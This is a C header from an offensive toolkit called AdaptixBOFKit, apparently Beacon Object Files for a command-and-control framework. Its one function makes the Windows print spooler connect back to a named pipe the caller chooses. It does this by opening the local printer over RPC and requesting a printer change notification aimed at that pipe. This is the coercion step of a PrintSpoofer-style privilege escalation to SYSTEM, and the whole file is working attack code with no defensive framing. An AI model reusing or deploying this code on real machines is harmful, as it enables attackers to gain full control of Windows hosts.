/*
 * AdaptixBOFKit - SpoolSS printer-change coercion.
 *
 * Asks the local print spooler to connect back to a named pipe.  Used by the
 * PrintSpoofer-style BOFs; the caller must already be listening on the pipe.
 */
#ifndef ADAPTIX_SPOOLSS_H
#define ADAPTIX_SPOOLSS_H

#include <windows.h>
#include <rpc.h>
#include "bofdefs.h"
#include "helpers.h"

static inline int bof_spoolss_coerce(const char *pipe)
{
    char notify[512];
    wchar_t wprinter[256], wnotify[512];
    RPC_CSTR binding = NULL;
    RPC_BINDING_HANDLE bh = NULL;
    handle_t hPrinter = NULL;
    DWORD rc;
    int ok = -1;

    if (!pipe || !pipe[0]) {
        bof_error_text("spoolss coerce", "empty pipe name");
        return -1;
    }
    bof_strncpy(notify, "\\\\127.0.0.1\\pipe\\", sizeof(notify));
    bof_strncat(notify, pipe, sizeof(notify) - bof_strlen(notify) - 1);

    bof_a2w("\\\\127.0.0.1", wprinter, 256);
    bof_a2w(notify, wnotify, 512);

    rc = RPCRT4$RpcStringBindingComposeA(NULL, (RPC_CSTR)"ncacn_np",
            (RPC_CSTR)"127.0.0.1", (RPC_CSTR)"\\pipe\\spoolss", NULL, &binding);
    if (rc != 0) {
        bof_error_rpc("RpcStringBindingCompose(ncacn_np)", rc,
                      "cannot build the spoolss RPC binding");
        return -1;
    }
    rc = RPCRT4$RpcBindingFromStringBindingA(binding, &bh);
    if (rc != 0) {
        bof_error_rpc("RpcBindingFromStringBinding", rc,
                      "cannot create the spoolss RPC binding handle");
        RPCRT4$RpcStringFreeA(&binding);
        return -1;
    }

    rc = SPOOLSS$RpcOpenPrinter(wprinter, &hPrinter, NULL, NULL, 0);
    if (rc != 0 || !hPrinter) {
        if (rc != 0)
            bof_error_rpc("RpcOpenPrinter", rc,
                          "the print spooler is unavailable or access was denied");
        else
            bof_error_text("RpcOpenPrinter", "returned success with a NULL handle");
        RPCRT4$RpcBindingFree(&bh);
        RPCRT4$RpcStringFreeA(&binding);
        return -1;
    }

    rc = SPOOLSS$RpcRemoteFindFirstPrinterChangeNotificationEx(
            hPrinter, 0x00000100 /* PRINTER_CHANGE_ADD_JOB */, 0,
            wprinter, 0, wnotify);
    SPOOLSS$RpcClosePrinter(&hPrinter);
    if (rc == 0) {
        ok = 0;
    } else {
        bof_error_rpc("RpcRemoteFindFirstPrinterChangeNotificationEx", rc,
                      "the spooler refused the change notification");
        bof_error_context("pipe", notify);
    }

    RPCRT4$RpcBindingFree(&bh);
    RPCRT4$RpcStringFreeA(&binding);
    return ok;
}

#endif /* ADAPTIX_SPOOLSS_H */
